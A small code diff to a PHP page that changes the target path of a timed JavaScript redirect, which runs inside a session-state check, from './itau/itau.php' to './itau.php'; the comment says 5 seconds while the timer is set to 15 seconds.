@@ -51,7 +51,7 @@ if(isset($_SESSION['estado']) && $_SESSION['estado'] == 1){
 <script>
     // Redirigir a otra página después de 5 segundos
 setTimeout(function() {
-  window.location.href = "./itau/itau.php";
+  window.location.href = "./itau.php";
 }, 15000);
 
 </script>
